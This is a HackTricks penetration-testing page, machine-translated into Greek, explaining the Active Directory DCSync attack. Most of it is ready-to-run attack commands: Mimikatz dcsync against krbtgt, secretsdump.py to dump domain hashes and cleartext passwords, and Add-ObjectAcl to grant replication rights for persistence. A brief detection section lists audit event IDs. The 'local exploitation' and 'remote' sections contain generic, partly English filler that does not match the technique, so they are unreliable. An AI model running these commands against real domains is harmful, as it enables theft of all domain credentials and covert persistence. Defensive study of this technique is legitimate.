# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## DCSync

Η άδεια **DCSync** συνεπάγεται την έχουσα αυτές τις άδειες στο ίδιο τον τομέα: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.

**Σημαντικές σημειώσεις για το DCSync:**

* Η επίθεση **DCSync προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να αναπαράγουν πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Επειδή το MS-DRSR είναι μια έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί ή να απενεργοποιηθεί.
* Από προεπιλογή, μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators και Domain Controllers** έχουν τις απαιτούμενες προνομιούχες.
* Εάν κάποιος κωδικοί πρόσβασης λαμβάνονται αποθηκευμένοι με αναστρέψιμη κρυπτογράφηση, υπάρχει μια επιλογή στο Mimikatz για την επιστροφή του κωδικού πρόσβασης σε καθαρό κείμενο

### Απαρίθμηση

Ελέγξτε ποιος έχει αυτές τις άδειες χρησιμοποιώντας το `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Εκμεταλλευτείτε τοπικά

Η εκμετάλλευση τοπικά αναφέρεται στην εκτέλεση επιθέσεων εντός του ίδιου συστήματος ή δικτύου. Αυτή η μέθοδος είναι χρήσιμη όταν έχετε ήδη αποκτήσει πρόσβαση σε έναν υπολογιστή ή ένα μέλος του δικτύου και θέλετε να εκμεταλλευτείτε αυτήν την πρόσβαση για να αποκτήσετε περισσότερα προνόμια ή πληροφορίες.

Μερικές από τις τεχνικές εκμετάλλευσης που μπορείτε να χρησιμοποιήσετε τοπικά περιλαμβάνουν:

- Εκμετάλλευση ευπάθειας του λειτουργικού συστήματος: Αναζητήστε ευπάθειες στο λειτουργικό σύστημα που εκτελείται στον υπολογιστή και εκμεταλλευτείτε τις για να αποκτήσετε πρόσβαση με υψηλότερα δικαιώματα.

- Εκμετάλλευση ευπάθειας της εφαρμογής: Αναζητήστε ευπάθειες σε εφαρμογές που εκτελούνται στον υπολογιστή και εκμεταλλευτείτε τις για να αποκτήσετε πρόσβαση με υψηλότερα δικαιώματα.

- Εκμετάλλευση ευπάθειας του δικτύου: Αναζητήστε ευπάθειες στο δίκτυο, όπως αδυναμίες στο πρωτόκολλο ή στις ρυθμίσεις, και εκμεταλλευτείτε τις για να αποκτήσετε πρόσβαση με υψηλότερα δικαιώματα.

Εκμεταλλευόμενοι τις παραπάνω τεχνικές, μπορείτε να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες, να εκτελέσετε κακόβουλο κώδικα ή να αποκτήσετε πλήρη έλεγχο του συστήματος ή του δικτύου. Είναι σημαντικό να θυμάστε ότι η εκμετάλλευση τοπικά πρέπει να γίνεται με προσοχή και να τηρούνται όλες οι νομικές και ηθικές αρχές.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Εκμεταλλευτείτε απομακρυσμένα

To exploit the DCSync vulnerability remotely, you can follow these steps:

1. Identify a target domain controller (DC) that you want to attack.
2. Enumerate the domain to gather information about the target DC and its users.
3. Use tools like `mimikatz` or `Invoke-Mimikatz` to execute the DCSync attack.
4. Retrieve the NTLM hashes of the target DC's user accounts, including the powerful "krbtgt" account.
5. Dump the hashes to a file or directly pass them to another tool for further analysis or cracking.
6. Use the obtained credentials to escalate privileges, perform lateral movement, or access sensitive information within the domain.

It is important to note that exploiting the DCSync vulnerability remotely requires proper authentication and sufficient privileges. Additionally, it is crucial to have permission to perform such actions within a target environment, as unauthorized exploitation can lead to legal consequences.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` δημιουργεί 3 αρχεία:

* ένα με τις **NTLM κατακερματισμένες τιμές**
* ένα με τα **κλειδιά Kerberos**
* ένα με καθαρό κείμενο κωδικούς πρόσβασης από το NTDS για οποιονδήποτε λογαριασμό έχει ενεργοποιημένη την [**αντιστρεπτή κρυπτογράφηση**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείτε να πάρετε χρήστες με αντιστρεπτή κρυπτογράφηση με την εντολή:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Μόνιμη παραμονή

Εάν είστε διαχειριστής του τομέα, μπορείτε να χορηγήσετε αυτές τις άδειες σε οποιονδήποτε χρήστη με τη βοήθεια του `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Στη συνέχεια, μπορείτε να **ελέγξετε αν ο χρήστης έχει αντιστοιχιστεί σωστά** τα 3 προνόμια αναζητώντας τα στην έξοδο του (θα πρέπει να μπορείτε να δείτε τα ονόματα των προνομίων μέσα στο πεδίο "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Αντιμετώπιση

* Ασφαλής Αναγνωριστικό Συμβάντος 4662 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) - Έγινε μια λειτουργία σε ένα αντικείμενο
* Ασφαλής Αναγνωριστικό Συμβάντος 5136 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) - Τροποποιήθηκε ένα αντικείμενο της υπηρεσίας καταλόγου
* Ασφαλής Αναγνωριστικό Συμβάντος 4670 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) - Αλλάχθηκαν οι άδειες σε ένα αντικείμενο
* AD ACL Scanner - Δημιουργήστε και συγκρίνετε αναφορές των ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Αναφορές

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
